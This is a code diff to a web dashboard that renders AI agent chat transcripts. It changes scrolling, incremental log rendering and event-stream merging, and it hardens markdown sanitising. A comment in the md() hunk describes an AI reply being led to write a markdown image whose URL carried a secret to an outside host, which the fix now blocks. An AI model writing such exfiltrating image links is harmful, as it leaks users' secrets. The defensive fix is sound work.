@@ -925,7 +925,7 @@
   #rival .t { flex: 1 1 300px; min-width: 0; }
   #rival b { color: var(--needs); }
   #rival .btn { padding: 2px 8px; font-size: 11px; flex: none; }
-  #log { overflow-y: auto; padding: 16px 18px 40px; scroll-behavior: smooth; zoom: var(--chat-zoom, 1); }   /* ⌘+ / ⌘- */
+  #log { overflow-y: auto; padding: 16px 18px 40px; zoom: var(--chat-zoom, 1); }   /* ⌘+ / ⌘- · no scroll-behavior: every scrollTop the page sets is a jump (opening a chat flew down a long one); the pill asks for its glide itself */
   #shead h2 .t { cursor: text; }
   #shead h2 input.tedit { font: inherit; font-weight: inherit; width: 100%; min-width: 0; box-sizing: border-box; border: 1px solid var(--accent); border-radius: 6px; padding: 0 6px; background: var(--bg); color: var(--ink); }
   #shead h2 input.tedit:focus { outline: none; }
@@ -4049,7 +4049,8 @@
     const el = $('#log'), at = s ? p.indexOf('chat') : 0, g = at < 0 ? 0 : at;   // shown nowhere: parked in the left half
     const host = $(GEL[g].body);
     if (el.parentElement !== host) { const top = el.scrollTop; host.insertBefore(el, host.firstChild); el.scrollTop = top; }
-    el.hidden = at < 0 || !!terms[g].id;
+    const was = el.hidden; el.hidden = at < 0 || !!terms[g].id;
+    if (was && !el.hidden) el.scrollTop = el.scrollHeight;   // out from under the drawer: what came while it was hidden was never scrolled to
     for (const tm of terms) {
       const host = $(tm.el.body), had = host.querySelector('.gempty'), want = isSplit(s) && !p[tm.g];
       if (want && !had) host.insertAdjacentHTML('beforeend', '<div class="gempty">Nothing in this half.<br>⌥⌘T a zsh · ⌥⌘G its PR · ⌥⌘E the editor<br>— or drag a tab here from the other half</div>');
@@ -4401,7 +4402,7 @@
   // read or resume. The header is written here, so `drawn` starts over.
   const NO_CHAT = { head: $('#shead').innerHTML, log: $('#log').innerHTML };
   function leaveChat(head = NO_CHAT.head, log = NO_CHAT.log, color = null) {
-    state.current = null; state.entries = []; history.replaceState(null, '', location.pathname); hidePr(); syncTerm(null);
+    state.current = null; state.entries = []; Object.assign(logOf, { id: null, gen: null, upto: null, waiting: false, pending: [] }); history.replaceState(null, '', location.pathname); hidePr(); syncTerm(null);
     const menu = $('#hmenu'); if (menu.open) menu.close();
     $('#prlist').hidden = true; $('#chat').classList.remove('vsc'); tintChat(color);
     $('#shead').innerHTML = head; $('#log').innerHTML = log; drawn.head = drawn.menu = drawn.prs = null; postChat(null);
@@ -4599,8 +4600,18 @@
   function md(t, cwd) {
     if (!hasMd) return { html: mdFallback(t), cls: '' };
     let html;
-    try { html = DOMPurify.sanitize(marked.parse(String(t ?? ''))); } catch { return { html: mdFallback(t), cls: '' }; }
+    // No styles and no forms in a transcript (2026-10-03): a <style> after a word, or a style= on a block, restyled or
+    // covered the whole board while the chat was open. Task lists keep their (disabled) checkboxes.
+    try { html = DOMPurify.sanitize(marked.parse(String(t ?? '')), { FORBID_TAGS: ['style', 'form', 'button', 'textarea', 'select'], FORBID_ATTR: ['style'] }); } catch { return { html: mdFallback(t), cls: '' }; }
     const tpl = document.createElement('template'); tpl.innerHTML = html;
+    // An image is fetched only if it is in the message itself (data:); one elsewhere is a link to it — a reply led to
+    // write ![](https://somewhere/?q=<a secret>) had the board send the secret there on sight, which the drawer never did.
+    for (const img of tpl.content.querySelectorAll('img')) {
+      const src = img.getAttribute('src') || '';
+      if (/^data:image\//i.test(src)) continue;
+      const a = document.createElement('a'); a.href = src; a.textContent = `🖼 ${img.getAttribute('alt') || src}`; a.title = `An image, not loaded: ${src}`;
+      img.replaceWith(a);
+    }
     highlight(tpl.content);
     for (const a of tpl.content.querySelectorAll('a[href]')) {
       const href = a.getAttribute('href') || '';
@@ -4640,41 +4651,50 @@
     if (e.kind === 'interrupt' || e.kind === 'compact') return `<div class="sysline">${esc(e.text)}</div>`;
     return '';
   }
-  function toolGroupHtml(run) {
+  function toolSummaryHtml(run) {
     const uses = run.filter(e => e.kind === 'tool_use');
     const errs = run.filter(e => e.kind === 'tool_result' && e.isError).length;
     const byName = {}; for (const u of uses) byName[u.name] = (byName[u.name] || 0) + 1;
     const label = Object.entries(byName).sort((a, b) => b[1] - a[1]).map(([n, c]) => c > 1 ? `${n} ×${c}` : n).join(', ');
-    return `<details class="toolgroup"><summary>${uses.length} tool call${uses.length === 1 ? '' : 's'} · ${esc(label)}${errs ? ` · <span class="err">${errs} error${errs > 1 ? 's' : ''}</span>` : ''}</summary>${run.map(entryHtml).join('')}</details>`;
+    return `${uses.length} tool call${uses.length === 1 ? '' : 's'} · ${esc(label)}${errs ? ` · <span class="err">${errs} error${errs > 1 ? 's' : ''}</span>` : ''}`;
   }
+  const toolGroupHtml = run => `<details class="toolgroup"><summary>${toolSummaryHtml(run)}</summary>${run.map(entryHtml).join('')}</details>`;
   // The transcript is appended to, not rewritten (2026-09-27): every `entries` event rebuilt the whole log — each
   // markdown body through marked, DOMPurify and highlight.js, then linkify over every text node — several times a
   // second while the open chat was clauding. Only what arrived is rendered now: a new entry is appended, and a run of
-  // tool calls still growing at the end has its <details> drawn again, its open state kept. Another chat, another
-  // list (a fetch hands the page a new array) or the fold toggled starts the log over.
-  const logView = { arr: null, n: 0, run: [], group: null };
+  // tool calls still growing at the end has its new rows appended and its summary written again (2026-10-03; the whole
+  // <details> was drawn again on every push before, a turn's worth of rows parsed and linkified per push), its open
+  // state kept. Another chat, or another list (a fetch hands the page a new array), starts the log over.
+  const logView = { arr: null, n: 0, run: [], group: null, drawnRun: 0 };
   const htmlNodes = (html, cwd) => { const t = document.createElement('template'); t.innerHTML = html; linkify(t.content, cwd); return t.content; };
-  function renderLog(reset = false) {
+  function renderLog() {
     const log = $('#log'), cwd = state.sessions.get(state.current)?.cwd;
     const stick = log.scrollHeight - log.scrollTop - log.clientHeight < 80;
-    if (reset || logView.arr !== state.entries || logView.n > state.entries.length) { log.innerHTML = ''; log.dataset.sid = state.current || ''; Object.assign(logView, { arr: state.entries, n: 0, run: [], group: null, fresh: 0, day: 'today' }); }
+    const resetting = logView.arr !== state.entries || logView.n > state.entries.length;
+    // The same chat drawn again (a reconnect's fetch) keeps your place in it, and lights no pill for what you had read
+    // (2026-10-03: thrown to the top, and "37 new replies" for the whole transcript).
+    const keep = resetting && log.dataset.sid === (state.current || '') && !stick ? log.scrollHeight - log.scrollTop : null;
+    if (resetting) { log.innerHTML = ''; log.dataset.sid = state.current || ''; Object.assign(logView, { arr: state.entries, n: 0, run: [], group: null, drawnRun: 0, fresh: 0, dayKey: new Date().toDateString() }); }
     // What comes while you read fades in (`.in`); the first fill stands still. New nodes go before the log's tail —
     // the presence line and the new-reply pill, which stay last.
     const live = logView.n > 0 && !log.hidden && !REDUCED.matches, arrived = state.entries.length - logView.n;
     let replies = 0;
-    const add = frag => { if (live) for (const c of frag.children) c.classList.add('in'); const tail = log.querySelector(':scope > .presence, :scope > .lognew'); if (tail) log.insertBefore(frag, tail); else log.append(frag); };
-    const group = () => {   // the trailing run of tool calls: its <details> made, or made again when it grew
-      if (!logView.run.length) return;
-      const frag = htmlNodes(toolGroupHtml(logView.run), cwd), el = frag.firstElementChild;
-      if (logView.group) { el.open = logView.group.open; logView.group.replaceWith(frag); } else add(frag);
-      logView.group = el;
+    const tail = log.querySelector(':scope > .presence, :scope > .lognew');   // once: per entry, it was a query over the whole log
+    const add = frag => { if (live) for (const c of frag.children) c.classList.add('in'); if (tail) log.insertBefore(frag, tail); else log.append(frag); };
+    const group = () => {   // the trailing run of tool calls: its <details> made, or its new rows added and its summary redone
+      const run = logView.run;
+      if (!run.length || logView.drawnRun === run.length) return;
+      if (!logView.group) { const frag = htmlNodes(toolGroupHtml(run), cwd); logView.group = frag.firstElementChild; add(frag); }
+      else { logView.group.append(htmlNodes(run.slice(logView.drawnRun).map(entryHtml).join(''), cwd)); logView.group.querySelector(':scope > summary').innerHTML = toolSummaryHtml(run); }
+      logView.drawnRun = run.length;
     };
     for (const e of state.entries.slice(logView.n)) {
       if (e.kind === 'tool_use' || e.kind === 'tool_result') { logView.run.push(e); continue; }
-      group(); logView.run = []; logView.group = null;
+      group(); logView.run = []; logView.group = null; logView.drawnRun = 0;
       // a line where the day changes, as the list has (2026-09-27, night): none for today's messages at the top, a
-      // date where the transcript goes to another day, "today" where it comes back
-      if (e.kind === 'text' && e.ts) { const d = dayOf(e.ts); if (d && d !== logView.day) { logView.day = d; add(htmlNodes(`<div class="sysline day"><b>${d}</b></div>`, cwd)); } }
+      // date where the transcript goes to another day, "today" where it comes back — by the date itself (2026-10-03: by
+      // its label, and a chat open across midnight had no line between yesterday's words and today's)
+      if (e.kind === 'text' && e.ts) { const k = new Date(e.ts).toDateString(); if (k !== 'Invalid Date' && k !== logView.dayKey) { logView.dayKey = k; add(htmlNodes(`<div class="sysline day"><b>${dayOf(e.ts)}</b></div>`, cwd)); } }
       add(htmlNodes(entryHtml(e), cwd));
       if (e.kind === 'text' && e.role === 'assistant') replies++;
     }
@@ -4685,7 +4705,8 @@
     if (!log.querySelector(':scope > :not(.presence, .lognew)')) log.insertAdjacentHTML('afterbegin', '<div class="empty">No messages yet</div>');
     renderPresence();
     if (stick) { log.scrollTop = log.scrollHeight; logNew(0); }
-    else if (arrived) { logView.fresh += replies; logNew(logView.fresh, arrived); }
+    else if (keep !== null) log.scrollTop = log.scrollHeight - keep;
+    else if (arrived && !resetting) { logView.fresh += replies; logNew(logView.fresh, arrived); }
   }
   // The pill at the log's foot (2026-09-27, night): what came while you were scrolled up — "new reply", "3 new
   // replies", or "more below" for tool activity alone — sticky at the bottom of the window, the twin of the list's
@@ -4732,11 +4753,14 @@
     renderBoard();
     if (s0) renderHead(s0);
     if (s0) syncTerm(s0);   // the tab it was on comes back at once — a page in the pane, its zsh; the drawer after the fetch (a chat not yet in the snapshot keeps what is attached until then)
-    const data = await api('GET', `/api/sessions/${id}/messages`).catch(() => null); if (!data) return;
+    awaitEntries(id);
+    const seen = sessionSeen.get(id) || 0;
+    const data = await api('GET', `/api/sessions/${id}/messages`).catch(() => null);
+    if (!data) { if (state.current === id) { takeEntries(id, { entries: [] }); renderLog(); } return; }   // nothing to show but what the stream brings
     // another chat opened while this one's answer was on its way (⌥⌘↓ ⌥⌘↑ in quick succession): the answer is stale
     // (2026-10-02) — it drew this chat's transcript under the other's header
     if (state.current !== id) return;
-    state.sessions.set(id, data.session); state.entries = data.entries; renderHead(data.session); renderLog(); syncTerm(data.session);
+    const s1 = takeSession(id, data, seen); takeEntries(id, data); renderHead(s1); renderLog(); syncTerm(s1);
     // A chat the snapshot did not have yet — the drawer's new one, told of over the `terminal` event before its own
     // `session` push — gets its card, and the project switch above, from the answer.
     if (!s0) { if (!inProject(data.session, projectStub(prefs.project))) { prefs.project = data.session.cwd || '?'; savePrefs(); } renderBoard(); }
@@ -4781,11 +4805,42 @@
   }
   $('#brandBtn').addEventListener('click', aboutOpen);
   $('#about').addEventListener('click', e => { if (e.target === $('#about')) $('#about').close(); });   // the backdrop
+  // The open chat's transcript as the page holds it (2026-10-03): which reading of the file (`gen` — a re-read numbers
+  // its entries afresh), how many of them it has (`upto`), and what the stream said while a fetch was on its way
+  // (`pending`). The fetch and the stream raced: an entry pushed before the answer landed went into the last chat's
+  // array, one in both was drawn twice, one pushed while a long chat was read was lost.
+  const logOf = { id: null, gen: null, upto: null, waiting: false, pending: [] };
+  const awaitEntries = id => Object.assign(logOf, { id, waiting: true, pending: logOf.id === id ? logOf.pending : [] });
+  /** A fetch's answer — its entries and its count (none: whatever comes is taken whole) — then what the stream said
+   *  meanwhile. */
+  function takeEntries(id, data) {
+    const pending = logOf.id === id ? logOf.pending : [];
+    state.entries = data.entries; Object.assign(logOf, { id, gen: data.gen ?? null, upto: data.upto ?? null, waiting: false, pending: [] });
+    for (const d of pending) mergeEntries(d);
+  }
+  /** The stream's entries for the open chat: only those past what the page has; another reading or a gap is a fetch. */
+  function mergeEntries(d) {
+    if (logOf.id !== d.sessionId) return;
+    if (logOf.waiting) { logOf.pending.push(d); return; }   // the fetch is on its way: after it
+    if (d.upto == null || logOf.upto == null) { state.entries.push(...d.entries); return; }   // a server from before the numbers, or a fetch that failed
+    if (d.gen !== logOf.gen) { refetchCurrent(); return; }
+    const from = d.upto - d.entries.length;
+    if (d.upto <= logOf.upto) return;                               // had them all
+    if (from > logOf.upto) { refetchCurrent(); return; }            // some went missing between
+    state.entries.push(...d.entries.slice(logOf.upto - from)); logOf.upto = d.upto;
+  }
+  // …and the summary: an answer older than a `session` event that came while it was on its way does not undo it
+  const sessionSeen = new Map();   // chat id → how many session events have come for it
+  function takeSession(id, data, seen) { if ((sessionSeen.get(id) || 0) === seen) state.sessions.set(id, data.session); return state.sessions.get(id) || data.session; }
   /** The open chat again — its summary, its entries, its tabs — without moving anything else on the page. */
   async function refetchCurrent() {
     const id = state.current; if (!id) return;
-    const data = await api('GET', `/api/sessions/${id}/messages`).catch(() => null); if (!data || state.current !== id) return;
-    state.sessions.set(id, data.session); state.entries = data.entries; renderHead(data.session); renderLog(); syncTerm(data.session);
+    const was = { entries: state.entries, gen: logOf.gen, upto: logOf.upto }, seen = sessionSeen.get(id) || 0;
+    awaitEntries(id);
+    const data = await api('GET', `/api/sessions/${id}/messages`).catch(() => null);
+    if (state.current !== id) return;
+    if (!data) { takeEntries(id, was); renderLog(); return; }   // what it had stands, and what came meanwhile is added
+    const s = takeSession(id, data, seen); takeEntries(id, data); renderHead(s); renderLog(); syncTerm(s);
   }
   function connect() {
     const es = new EventSource('/events');
@@ -4809,7 +4864,7 @@
       else if (state.current && state.sessions.has(state.current)) refetchCurrent();
     });
     es.addEventListener('session', e => {
-      const s = JSON.parse(e.data), was = state.sessions.get(s.id); state.sessions.set(s.id, s);
+      const s = JSON.parse(e.data), was = state.sessions.get(s.id); state.sessions.set(s.id, s); sessionSeen.set(s.id, (sessionSeen.get(s.id) || 0) + 1);
       const landed = was?.status === 'working' && s.status === 'idle' && !s.done;
       if (landed) { landedAt.set(s.id, performance.now()); noteMotion(s.id, 'landed'); }   // the reply landed: the card flares once (flareLanded)
       if (s.id === state.current && !visible(s) && s.done) leaveChat();   // an empty chat ticked done: its card is gone, and so is the chat
@@ -4818,7 +4873,7 @@
       // The chats step follows its chats — one ticked there leaves, one that stopped clauding says ready.
       if ($('#pick').open && pick.mode === 'chats' && (pick.list.some(x => x.id === s.id) || scopeChats(pick.ctx).some(x => x.id === s.id))) pickRender(true);
     });
-    es.addEventListener('entries', e => { const d = JSON.parse(e.data); if (d.sessionId === state.current) { state.entries.push(...d.entries); renderLog(); } });
+    es.addEventListener('entries', e => { const d = JSON.parse(e.data); if (d.sessionId === state.current) { mergeEntries(d); renderLog(); } });
     es.addEventListener('projects', e => { state.projects = JSON.parse(e.data).projects || []; renderBoardSoon(); });
     es.addEventListener('peacock', e => { state.peacock = JSON.parse(e.data).colors || {}; renderBoardSoon(); const s = state.sessions.get(state.current); if (s) renderHead(s); });
     es.addEventListener('repos', e => { state.repos = JSON.parse(e.data).repos || {}; });
